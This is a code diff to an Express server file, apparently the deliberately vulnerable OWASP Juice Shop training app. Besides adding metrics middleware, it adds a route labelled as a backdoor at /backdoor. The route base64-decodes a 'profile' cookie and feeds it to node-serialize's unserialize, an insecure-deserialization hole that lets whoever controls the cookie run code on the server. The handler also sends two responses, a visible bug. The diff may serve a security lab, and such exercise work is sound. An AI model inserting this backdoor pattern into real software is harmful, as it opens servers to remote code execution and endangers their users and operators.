@@ -67,6 +67,13 @@ const updateUserProfile = require('./routes/updateUserProfile')
 const twoFactorAuth = require('./routes/2fa')
 const config = require('config')
 
+const escape = require('escape-html')
+const serialize = require('node-serialize');
+
+const promBundle = require("express-prom-bundle");
+const metricsMiddleware = promBundle({includeMethod: true,includePath:true});
+
+
 errorhandler.title = `${config.get('application.name')} (Express ${utils.version('express')})`
 
 require('./lib/startup/validatePreconditions')()
@@ -85,6 +92,9 @@ app.locals.abused_ssrf_bug = false
 app.options('*', cors())
 app.use(cors())
 
+/* Prometheus Metrics*/ 
+app.use(metricsMiddleware);
+
 /* Security middleware */
 app.use(helmet.noSniff())
 app.use(helmet.frameguard())
@@ -95,6 +105,8 @@ app.use((req, res, next) => {
   req.url = req.url.replace(/[/]+/g, '/')
   next()
 })
+
+
 
 /* Security Policy */
 app.get('/.well-known/security.txt', verify.accessControlChallenges())
@@ -135,6 +147,25 @@ app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument))
 app.use(express.static(path.join(__dirname, '/frontend/dist/frontend')))
 
 app.use(cookieParser('kekse'))
+app.use(cookieParser())
+
+/* I'm a backdoor*/
+app.get('/backdoor', function(req, res) {
+  if (req.cookies.profile) {
+    var str = new Buffer(req.cookies.profile, 'base64').toString();
+    var obj = serialize.unserialize(str);
+    if (obj.username) {
+      res.send("Hello " + escape(obj.username));
+    }
+  } else {
+      res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
+        maxAge: 900000,
+        httpOnly: true
+      });
+  }
+  res.send("I'm a backdoor");
+ });
+
 
 app.use(bodyParser.urlencoded({ extended: true }))
 /* File Upload */
